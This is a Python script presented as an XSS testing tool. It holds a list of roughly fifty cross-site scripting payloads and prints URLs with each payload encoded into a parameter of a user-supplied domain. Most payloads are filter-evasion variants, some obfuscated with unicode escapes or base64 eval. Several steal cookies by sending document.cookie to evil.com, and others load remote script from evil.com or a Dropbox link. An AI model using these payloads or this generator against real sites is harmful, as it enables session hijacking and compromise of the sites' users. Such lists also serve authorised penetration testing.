import urllib.parse

# List of 50 XSS payloads
XSS_PAYLOADS = [
    '<img src=123>', 
    '<a href="javascript:alert(document.domain)">xss</a>',
    '<svg></svg><img src=1>', 
    r'\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e',
    '<script /***/>/***/confirm(document.cookie,document.domain)/***/</script /***/', 
    '</title/\'/</style/</script/--><p" onclick=alert()//>*/alert()/*',
    '<svg><script x:href="https://dl.dropbox.com/u/13018058/js.js">',
    '<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(document.domain,document.cookie)&NewLine;>X</a>',
    '<iframe onload="javascript:prompt(document.domain)" id="hello" role="world">',
    '‘>alert(154)<​/script><​script/154=’;;;;;;;', 
    'returnuri=%09Jav%09ascript:alert(document.domain)', 
    '<iframe src=%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">',
    r'<script %20~~~>\u0061\u006C\u0065\u0072\u0074(\'XSS\')</script %20~~~>', 
    '<x/onpointerRawupdate=confirm%26Ipar;1)//x',
    '<svg/onload=eval(atob("YWxlcnQoJ1hTUycp"))>', 
    r'"<b onmouseover=alert(\'Wufff!\')>click me!</b>',
    '"><script>alert(document.cookie)</script>', 
    '"><body/oNpagEshoW=(confirm)(document.domain)>',
    '<img/src/onerror=alert&#xFEFF;(1)>', 
    '<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`1` //',
    '<noscript><p title="</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()">',
    '<svg/oNlY=1 ONlOAD=confirm(document.domain)>', 
    '<iframe src="javascript​:alert(\'hacked\');"></IFRAME>',
    '<div ng-app> <strong class="ng-init:constructor.constructor(\'alert(\'hacked\')\')()">aaa</strong> </div>',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<style>@import\'xss.css\';</style>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<a href="javascript:document.body.innerHTML=\'<h1>Hacked!</h1>\'">Click me!</a>',
    '<script>document.location=\'http://evil.com?cookie=\' + document.cookie;</script>',
    '<svg/onload="fetch(`http://evil.com/?cookie=` + document.cookie)">',
    '<iframe src="javascript:alert(document.domain)"></iframe>',
    '<form action="javascript:alert(1)"><input type="submit" value="Submit"></form>',
    '<script src="http://evil.com/xss.js"></script>',
    '<img src=x onerror="alert(document.domain)">',
    '<video onerror="alert(1)"><source src="invalid.mp4"></video>',
    '<object data="data:text/html,<script>alert(1)</script>"></object>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<div onclick="alert(1)">Click me!</div>',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<script src="data:text/javascript,alert(1)"></script>',
    '<body onload="alert(1)">',
    '<body onerror="alert(1)">',
    '<script>var img = new Image(); img.src="x" + document.domain + "/";</script>',
    '<script>if (1) alert(1);</script>',
    '<svg><script>alert(1)</script></svg>',
    '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
    '<style>@import`http://evil.com/xss.css`;</style>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<input type="text" onfocus="alert(1)">',
    '<img src="#" onerror="alert(1)">',
    '<audio src="invalid.mp3" onerror="alert(1)"></audio>',
    '<canvas onmousemove="alert(1)"></canvas>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<div style="background:url(javascript:alert(1))"></div>',
    '<script>fetch(`http://evil.com?cookie=` + document.cookie)</script>',
]

def generate_urls(domain, param):
    urls_with_payloads = []
    for payload in XSS_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)
        url = f"{domain}?{param}={encoded_payload}"
        urls_with_payloads.append(url)
    return urls_with_payloads

def main():
    print("XssPrnv: XSS Testing Tool")
    domain = input("Enter the Domain (e.g., https://example.com): ").strip()
    param = input("Enter the Parameter Name (e.g., search): ").strip()

    if domain and param:
        urls = generate_urls(domain, param)
        print("\nGenerated XSS Test URLs:")
        for url in urls:
            print(url)
    else:
        print("Both domain and parameter name are required.")

if __name__ == "__main__":
    main()
